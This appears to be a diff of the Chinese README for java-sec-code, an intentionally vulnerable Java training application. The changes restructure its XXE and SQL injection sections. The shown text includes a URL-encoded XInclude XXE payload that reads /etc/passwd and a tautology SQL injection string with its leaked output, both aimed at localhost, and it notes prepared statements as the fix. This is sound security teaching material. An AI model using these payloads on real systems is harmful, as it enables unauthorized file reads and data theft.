@@ -17,6 +17,7 @@
 - [远程命令执行](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Rce.java)
 - [反序列化](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Deserialize.java)
 - [文件上传](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/FileUpload.java)
+- [SQL注入](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SQLI.java)
 
 ## 如何运行
 
@@ -106,6 +107,8 @@ if __name__ == '__main__':
 
 ## XXE
 
+### 支持Xinclude的XXE
+
 2018年08月22日更新支持XInclude的XXE漏洞代码，详情见代码。
 
 POC
@@ -117,25 +120,40 @@ POC
 </root>
 ```
 
-URL编码后
+URL编码后的payload
 
 ``` 
 http://localhost:8080/xxe/DocumentBuilder_xinclude?xml=%3C%3fxml+version%3d%221.0%22+%3f%3E%0d%0a%3Croot+xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3E%0d%0a+%3Cxi%3ainclude+href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22+parse%3d%22text%22%2f%3E%0d%0a%3C%2froot%3E
 ```
 
+详情可以查看[浅析xml之xinclude & xslt](https://www.anquanke.com/post/id/156227)
+
 ## SQL注入
 
-POC
+### POC
+
+访问
 
 ``` 
 http://localhost:8080/sqli/jdbc?name=joychou' or 'a'='a
 ```
 
-返回`joychou: 123 wilson: 456 lightless: 789`
+返回
+```
+joychou: 123 wilson: 456 lightless: 789
+```
 
-正常访问`http://localhost:8080/sqli/jdbc?name=joychou`，返回`joychou: 123`
+正常访问
+```
+http://localhost:8080/sqli/jdbc?name=joychou
+```
 
-数据库配置：
+返回
+
+``` 
+joychou: 123
+```
+### 数据库配置
 
 ```sql
 /*
@@ -180,7 +198,7 @@ SET FOREIGN_KEY_CHECKS = 1;
 
 ```
 
-说明：
+### 说明
 
 SQL注入修复方式采用预处理方式，修复见代码。
 Mybatis的`#{}`也是预处理方式处理SQL注入。
